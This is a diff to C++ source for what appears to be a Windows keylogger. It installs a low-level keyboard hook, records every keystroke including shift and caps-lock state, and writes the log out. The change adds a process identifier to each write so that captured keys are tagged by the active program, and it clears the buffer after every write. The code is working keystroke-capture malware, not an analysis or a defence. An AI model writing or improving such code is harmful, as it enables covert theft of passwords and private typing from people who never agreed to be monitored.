@@ -4,6 +4,8 @@
 HHOOK hook = nullptr;
 std::string key_log;
 
+uint32_t active_process = 0x0;
+
 bool caps = false;
 bool shift = false;
 
@@ -15,10 +17,8 @@ LRESULT key_hook::RunHook(int n_code, WPARAM wparam, LPARAM lparam) {
 
   if (wparam==WM_KEYDOWN || wparam==WM_SYSKEYDOWN) {
 	DWORD key = kb_dll_hook_struct->vkCode;
-
 	if (key==VK_CAPITAL) {
 	  caps = !caps;
-
 	  if (!caps) {
 		std::string key_name = key_const::AddKey(key, caps, shift);
 		key_name.insert(1, "/");
@@ -27,7 +27,6 @@ LRESULT key_hook::RunHook(int n_code, WPARAM wparam, LPARAM lparam) {
 		key_log += key_const::AddKey(key, caps, shift);
 	  }
 	} else if (key==VK_SHIFT || key==VK_RSHIFT || key==VK_LSHIFT) {
-
 	  if (!shift) {
 		shift = true;
 		key_log += key_const::AddKey(key, caps, shift);
@@ -35,14 +34,14 @@ LRESULT key_hook::RunHook(int n_code, WPARAM wparam, LPARAM lparam) {
 	} else {
 	  key_log += key_const::AddKey(key, caps, shift);
 	}
-	stream::WriteLog(key_log);
+	stream::WriteLog(key_log, active_process);
+	key_log.clear();
   }
 
   if (kb_dll_hook_struct->vkCode==VK_RETURN) {
 	key_log += '\n';
   } else if (wparam==WM_KEYUP || wparam==WM_SYSKEYUP) {
 	DWORD key = kb_dll_hook_struct->vkCode;
-
 	if (key==VK_SHIFT || key==VK_RSHIFT || key==VK_LSHIFT) {
 	  shift = false;
 	}
@@ -62,7 +61,8 @@ LRESULT key_hook::RunHook(int n_code, WPARAM wparam, LPARAM lparam) {
 	  std::string key_name = key_const::AddKey(kb_dll_hook_struct->vkCode, caps, shift);
 	  key_name.insert(1, "/");
 	  key_log += key_name;
-	  stream::WriteLog(key_log);
+	  stream::WriteLog(key_log, active_process);
+	  key_log.clear();
 	}
   }
   return CallNextHookEx(hook, n_code, wparam, lparam);
